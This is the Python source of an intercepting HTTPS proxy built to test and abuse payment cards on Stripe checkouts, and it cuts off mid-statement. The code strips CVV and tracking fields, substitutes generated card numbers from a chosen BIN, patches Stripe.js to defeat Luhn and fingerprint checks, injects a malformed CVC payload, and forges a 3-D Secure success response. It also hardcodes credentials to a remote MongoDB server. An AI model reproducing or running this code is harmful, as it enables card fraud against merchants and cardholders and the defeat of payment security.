import base64
import glob
import gzip
import http.client
import http.server
import random
import importlib
import json
import os
import re
import select
import socket
import ssl
import base64
import requests
import sys
import datetime
import threading
import time
import urllib.parse
import zlib
from http.client import HTTPMessage
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from subprocess import PIPE, Popen
import socketserver
import hashlib
import io
import brotli
import tempfile
from OpenSSL import crypto
import traceback
import logging
from pymongo import MongoClient

bin_whitelist = ["Oxxi1337", "Dons"]

logging.getLogger('http.server').setLevel(logging.CRITICAL + 1)

userDatabase = MongoClient('mongodb://mohio:ck1QpFfooZ3Nb30k@185.253.54.63:27017/admin?authSource=admin').admin.mohio

def request_handler(req, req_body):
	if req.path.split("://", 1)[1].startswith("api.stripe.com"):
		try:
			if b"payment_method_data[card][number]" in req_body:
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

				#Delete CVV
				parsedbody = deletefromarray(parsedbody, "payment_method_data[card][cvc]")
				
				#Delete logging fields
				parsedbody = deletefromarray(parsedbody, "payment_method_data[pasted_fields]")
				parsedbody = deletefromarray(parsedbody, "payment_method_data[time_on_page]")

				if parsedbody["payment_method_data[card][number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["payment_method_data[card][number]"] = parsedbody["payment_method_data[card][number]"].replace(" ", "").replace("409595", "")

				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["payment_method_data[card][number]"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["payment_method_data[card][number]"] = gennedCC[0]
					parsedbody["payment_method_data[card][exp_month]"] = gennedCC[1]
					parsedbody["payment_method_data[card][exp_year]"] = gennedCC[2]

				req.addToLogs("yellow:yellow:TESTING CARD: "+parsedbody["payment_method_data[card][number]"].replace(" ", "")+"|"+parsedbody["payment_method_data[card][exp_month]"]+"|"+parsedbody["payment_method_data[card][exp_year]"])

				req_body = build_x_www_form_urlencoded(parsedbody).encode()
			elif b"card[number]" in req_body:
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

				#Delete CVV
				parsedbody = deletefromarray(parsedbody, "card[cvc]")

				#Delete logging fields
				parsedbody = deletefromarray(parsedbody, "pasted_fields")
				parsedbody = deletefromarray(parsedbody, "time_on_page")

				if parsedbody["card[number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["card[number]"] = parsedbody["card[number]"].replace(" ", "").replace("409595", "")

				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["card[number]"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["card[number]"] = gennedCC[0]
					parsedbody["card[exp_month]"] = gennedCC[1]
					parsedbody["card[exp_year]"] = gennedCC[2]

				req.addToLogs("yellow:yellow:TESTING CARD: "+parsedbody["card[number]"].replace(" ", "")+"|"+parsedbody["card[exp_month]"]+"|"+parsedbody["card[exp_year]"])

				req_body = build_x_www_form_urlencoded(parsedbody).encode()
			elif b"source_data[card][number]" in req_body:
				parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))

				#Delete CVV
				parsedbody = deletefromarray(parsedbody, "source_data[card][cvc]")

				#Delete logging fields
				parsedbody = deletefromarray(parsedbody, "source_data[pasted_fields]")
				parsedbody = deletefromarray(parsedbody, "source_data[time_on_page]")

				if parsedbody["source_data[card][number]"].replace(" ", "").startswith("409595") and not req.getCurrentUser().get("username") in bin_whitelist:
					parsedbody["source_data[card][number]"] = parsedbody["source_data[card][number]"].replace(" ", "").replace("409595", "")

				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["source_data[card][number]"].replace(" ", "")):
					gennedCC = gencc(req.getCurrentUser().get("settings").get("bin"))
					parsedbody["source_data[card][number]"] = gennedCC[0]
					parsedbody["source_data[card][exp_month]"] = gennedCC[1]
					parsedbody["source_data[card][exp_year]"] = gennedCC[2]

				req.addToLogs("yellow:yellow:TESTING CARD: "+parsedbody["source_data[card][number]"].replace(" ", "")+"|"+parsedbody["source_data[card][exp_month]"]+"|"+parsedbody["source_data[card][exp_year]"])

				req_body = build_x_www_form_urlencoded(parsedbody).encode()
		except Exception as e:
			traceback.print_exc()
			pass
	
	try:
		if req.path.split("://", 1)[1].startswith("m.stripe.com") and False:
			#Fingerprint randomization
			old_req = req_body
			payload = json.loads(urllib.parse.unquote_plus(base64.b64decode(req_body).decode()))

			if payload.get("h", False) != False:
				start_time = random.randint(5000, 20000)

				payload["t"] = start_time
				payload["a"] = {
					"a": {
						"v": "true", #Don't know, probably always true
						"t": random.randint(1,9)/10
					},
					"b": {
						"v": "false", #Don't know, probably always false
						"t": random.randint(1,9)/10
					},
					"c": {
						"v": "en-US", #Browser language
						"t": random.randint(1,9)/10
					},
					"d": {
						"v": "Win32", #OS Version
						"t": random.randint(1,9)/10
					},
					"e": {
						"v": "PDF Viewer,internal-pdf-viewer", #Printer extensions
						"t": random.randint(1,9)/10
					},
					"f": {
						"v": "1920w_1040h_24d_1r", #Display settings
						"t": random.randint(1,9)/10
					},
					"g": {
						"v": "2", #Don't know, probably always 2
						"t": random.randint(1,9)/10
					},
					"h": {
						"v": "false", #Don't know, probably always false
						"t": random.randint(1,9)/10
					},
					"i": {
						"v": "sessionStorage-enabled, localStorage-enabled", #Get eyes
						"t": random.randint(50,100)/10
					},
					"j": {
						"v": "1111111111111111111111111111111111111111111111111111111", # What fonts you have, represented in 1s or 0s, it checks for these fonts: [["Andale Mono", "mono"], ["Arial Black", "sans"], ["Arial Hebrew", "sans"], ["Arial MT", "sans"], ["Arial Narrow", "sans"], ["Arial Rounded MT Bold", "sans"], ["Arial Unicode MS", "sans"], ["Arial", "sans"], ["Bitstream Vera Sans Mono", "mono"], ["Book Antiqua", "serif"], ["Bookman Old Style", "serif"], ["Calibri", "sans"], ["Cambria", "serif"], ["Century Gothic", "serif"], ["Century Schoolbook", "serif"], ["Century", "serif"], ["Comic Sans MS", "sans"], ["Comic Sans", "sans"], ["Consolas", "mono"], ["Courier New", "mono"], ["Courier", "mono"], ["Garamond", "serif"], ["Georgia", "serif"], ["Helvetica Neue", "sans"], ["Helvetica", "sans"], ["Impact", "sans"], ["Lucida Fax", "serif"], ["Lucida Handwriting", "script"], ["Lucida Sans Typewriter", "mono"], ["Lucida Sans Unicode", "sans"], ["Lucida Sans", "sans"], ["MS Gothic", "sans"], ["MS Outlook", "symbol"], ["MS PGothic", "sans"], ["MS Reference Sans Serif", "sans"], ["MS Serif", "serif"], ["MYRIAD PRO", "sans"], ["MYRIAD", "sans"], ["Microsoft Sans Serif", "sans"], ["Monaco", "sans"], ["Monotype Corsiva", "script"], ["Palatino Linotype", "serif"], ["Palatino", "serif"], ["Segoe Script", "script"], ["Segoe UI Semibold", "sans"], ["Segoe UI Symbol", "symbol"], ["Segoe UI", "sans"], ["Tahoma", "sans"], ["Times New Roman PS", "serif"], ["Times New Roman", "serif"], ["Times", "serif"], ["Trebuchet MS", "sans"], ["Verdana", "sans"], ["Wingdings 3", "symbol"], ["Wingdings", "symbol"]]
						"t": start_time-random.randint(50,200),
						"at": random.randint(15000,20000)/10
					},
					"k": {
						"v": "", #Don't know, its blank lol
						"t": random.randint(1,9)/10
					},
					"l": {
						"v": req.headers["User-Agent"], #Client's user agent
						"t": random.randint(1,9)/10
					},
					"m": {
						"v": "", #Don't know, its blank lol
						"t": random.randint(1,9)/10
					},
					"n": {
						"v": "false", #Don't know, probably always false
						"t": random.randint(15000,20000)/10
					},
					"o": {
						"v": hashlib.md5(os.urandom(128)).hexdigest(), #Canvas encoded to md5, who says it has to be a canvas tho :troll_face:
						"t": random.randint(1,9)/10
					},
				}

			print(payload)

			req_body = base64.b64encode(urllib.parse.quote(json.dumps(payload, separators=(',', ':')), safe='').encode())
	except Exception as e:
		traceback.print_exc()

	return req_body

def response_handler(req, req_body, res, res_body):
	if req.path.split("://", 1)[1].startswith("js.stripe.com"):
		#Luhn check bypass
		pattern = re.compile(b'return [a-zA-Z0-9]%10==0')
		res_body = pattern.sub(b'return true', res_body)
		res_body = res_body.replace(b'return u(r,i,n)', b'return null')

		stripejsuuid = b"//# sourceMappingURL=https://js.stripe.com/v3/sourcemaps/stripe-"
		if res_body.endswith(b".js.map") and stripejsuuid in res_body.split(b"\n", 1)[1]:
			#Fingerprint bypass
			res_body = res_body.replace(b"Mo:function(){return d},Ye:function(){return p}", b"Mo:function(){return false},Ye:function(){return false}")

			if isWin():
				sdf = open("static\\stripedetected.js", "rb")
			else:
				sdf = open("static/stripedetected.js", "rb")
			sd = sdf.read().replace(b"STRIPEVERSIONHERE", res_body.split(b",version:\"", 1)[1].split(b"\"", 1)[0])
			res_body = res_body+b"\r\n"+sd
			sdf.close()

	try:
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_pages/"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'"completed": true' in res_body:
				req.addToLogs('green:lime:CARD APPROVED')
			
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_intents/") and not req.path.split("://", 1)[1].endswith("verify_challenge"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'succeeded' in res_body:
				req.addToLogs('green:lime:CARD APPROVED')
		
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/checkout/sessions/completed_webhook_delivered/"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("red:red:BAD CARD : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'"completed": true' in res_body:
				req.addToLogs('green:lime:CARD APPROVED')
	except Exception as e:
		traceback.print_exc()
		pass

	if req.path.split("://", 1)[1].startswith("api.stripe.com") and req.path.endswith("/v1/payment_methods"):
		try:
			parsedbody = parse_x_www_form_urlencoded(req_body.decode("utf-8"))
			if parsedbody["payment_user_agent"].endswith("checkout"):
				#Here we are using a checkout, time to do the funny

				parsedbody = deletefromarray(parsedbody, "card[cvc]")
				unexploited_payload = build_x_www_form_urlencoded(parsedbody)

				#Big meme right here LMFAO
				payload=unexploited_payload+"&card[cvc]=&card[cvc]=[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]"

				res_body = requests.post("https://api.stripe.com/v1/payment_methods", headers=req.headers, verify=True, proxies=req.getFormattedProxy(), data=payload).text.replace('{\n  "error": {\n    "type": "api_error",\n    "message" : "Sorry, something went wrong. We\'ve already been notified of the problem, but if you need any help, you can reach us at support.stripe.com/contact."\n  }\n}', '').encode()
		except Exception as e:
			print(e)


	if req.path.split("://", 1)[1].startswith("api.stripe.com") and req.path.endswith("/v1/3ds2/authenticate"):
		try:
			req_body = req_body.decode("utf-8")
			if "one_click_authn_device_support[hosted]" in req_body:
				# Here we have the authorization request, we are going to swap out the response with a success one

				challengeHeaders = req.headers
				del challengeHeaders["Content-Length"]

				challengeData = parse_x_www_form_urlencoded(req_body)
				del challengeData["one_click_authn_device_support[hosted]"]
				del challengeData["one_click_authn_device_support[same_origin_frame]"]
				del challengeData["one_click_authn_device_support[spc_eligible]"]
				del challengeData["one_click_authn_device_support[webauthn_eligible]"]
				del challengeData["one_click_authn_device_support[publickey_credentials_get_allowed]"]
				del challengeData["browser"]
				challengeData = build_x_www_form_urlencoded(challengeData)
				jresbody = json.loads(res_body.decode("utf-8"))

				payload = {
					"messageType":"CRes",
					"messageVersion":"2.1.0",
					"threeDSServerTransID":jresbody["ares"]["threeDSServerTransID"],
					"acsTransID":jresbody["ares"]["acsTransID"],
					"transStatus":"Y"
				}

				stringedpayload=json.dumps(payload, separators=(',', ':'))

				challengeData+= "&final_cres="+urllib.parse.quote_plus(stringedpayload)

				res_body = requests.post("https://api.stripe.com/v1/3ds2/challenge_complete", proxies=req.getFormattedProxy(), headers=challengeHeaders, data=challengeData).text.encode("utf-8")
		except Exception as e:
			traceback.print_exc()

		req_body = req_body.encode("utf-8")

	return res_body

def isWin():
	return (True if os.name == 'nt' else False)

def deletefromarray(array, element):
	try:
		del array[element]
	except:
		pass
	return array

def parse_x_www_form_urlencoded(data):
	result = {}
	for item in data.split('&'):
		key, value = item.split('=')
		result[key] = value.replace('+', ' ').replace('%20', ' ')
	return result

def build_x_www_form_urlencoded(data):
	result = []
	for key, value in data.items():
		value = value.replace(' ', '+')
		result.append(f"{key}={value}")
	return '&'.join(result)

def gencc(U):
	while True:
		if len(U)<16:U=U+'x'
		else:break
	def C(L):
		def B(n):return[int(A)for A in str(n)]
		C=B(L);D=C[-1::-2];E=C[-2::-2];A=0;A+=sum(D)
		for F in E:A+=sum(B(F*2))
		return A%10
	def D(x,t):
		def G(aS,n):
			aS=str(aS)
			if n>=1:A=aS[-n:]
			else:A=''
			return A
		def C(aS,n,n2=None):
			A=n2;aS=str(aS)
			if A is None or A=='':A=len(aS)
			n,A=int(n),int(A)
			if n<0:n+=1
			B=aS[n-1:n-1+A];return B
		def B(x,t=1):
			x=str(x)
			if t>0:
				while len(x)>t:A=sum([int(x[A])for A in range(len(x))]);x=str(A)
			else:
				for B in range(abs(t)):A=sum([int(x[A])for A in range(len(x))]);x=str(A)
			return int(x)
		D=False;E='';A=1
		for H in range(1,len(x)):
			I=int(C(x,H,1))*int(C('21',A,1));E+=str(B(I));A+=1
			if A>len('21'):A=1
		F=B(E,-1)
		if(10*B(F,-1)-F)%10==int(G(x,1)):D=True
		return D
	while True:
		A=''
		for B in U:
			if len(A)<16 and'x'==B.lower():A+=str(random.randint(0,9))
			else:A+=str(B)
		if C(A)==0 and D(A,random.randint(0,9)):return A,str(random.choice(list(range(1,13)))).zfill(2),str(random.choice(list(range(datetime.date.today().year+1,datetime.date.today().year+8))))[-2:],str(random.randrange(1000)).zfill(3)

def checkcc(A,C):
	if A=="":return True
	while True:
		if len(A)<16:A=A+'x'
		else:break
	if len(A)!=len(C):return False
	for B in range(len(A)):
		if A[B]!='x'and A[B]!=C[B]:return False
	return True

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
	address_family = socket.AF_INET6
	daemon_threads = True

	def handle_error(self, request, client_address):
		# surpress socket/ssl related errors
		cls, e = sys.exc_info()[:2]
		if cls is socket.error or cls is ssl.SSLError:
			pass
		else:
			return HTTPServer.handle_error(self, request, client_address)


class ProxyRequestHandler(BaseHTTPRequestHandler):
	def log_message(self, format, *args):
		pass

	def handle(self):
		try:
			super().handle()
		except Exception as e:
			logging.debug("Exception in ProxyRequestHandler: %s", e)

	def do_CONNECT(self):
		host, _ = self.path.split(":", 1)
		self.ishttps = True
		self.hostname = host

		if not self.isAuthorized() and self.hostname != "mohio":
			self.connect_intercept()
			return

		blacklisted_domains = ["r.stripe.com", "geoissuer.cardinalcommerce.com"]
		allowed_domains = ["api.stripe.com", "js.stripe.com", "m.stripe.com", "mohio"]
		try:
			if self.hostname in blacklisted_domains:
				self.send_response_only(404, "Not Found")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
				return
			if self.hostname in allowed_domains:
				self.connect_intercept()
			else:
				self.connect_no_intercept()
		except Exce
